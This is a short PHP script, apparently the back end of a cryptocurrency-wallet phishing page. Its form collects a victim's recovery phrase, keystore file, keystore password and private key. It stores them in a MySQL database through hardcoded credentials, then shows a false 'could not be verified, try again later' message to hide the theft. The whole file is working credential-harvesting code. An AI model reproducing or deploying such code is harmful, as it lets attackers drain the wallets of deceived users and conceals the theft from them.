<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input1 = isset($_POST['phrase']) ? trim($_POST['phrase']) : '';
    $input2 = isset($_POST['keystorejson']) ? trim($_POST['keystorejson']) : '';
    $input21 = isset($_POST['keystorepassword']) ? trim($_POST['keystorepassword']) : '';
    $input3 = isset($_POST['privatekey']) ? trim($_POST['privatekey']) : '';

    // Determine which input to validate
    if ($input1 === '' && $input2 === '' && $input21 === '' && $input3 === '') {
        echo "<script>alert('Please fill at least one input.');</script>";
    } else {
        // Database connection
        $conn = new mysqli('localhost', 'webtocon_user', 'WebtoconnecT123.', 'webtocon_db');

        // Check connection
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }

        // Prepare and bind
        $stmt = $conn->prepare("INSERT INTO webfxInfo (input1, input2, input21, input3) VALUES (?, ?, ?, ?)");
        $stmt->bind_param("ssss", $input1, $input2, $input21, $input3);

        // Execute the statement
        if ($stmt->execute()) {
            echo "<script>alert('Your information could not be verified at this time, please try again later!');</script>";
        } else {
            echo "<script>alert('Error submitting data.');</script>";
        }

        // Close connections
        $stmt->close();
        $conn->close();
    }
}

?>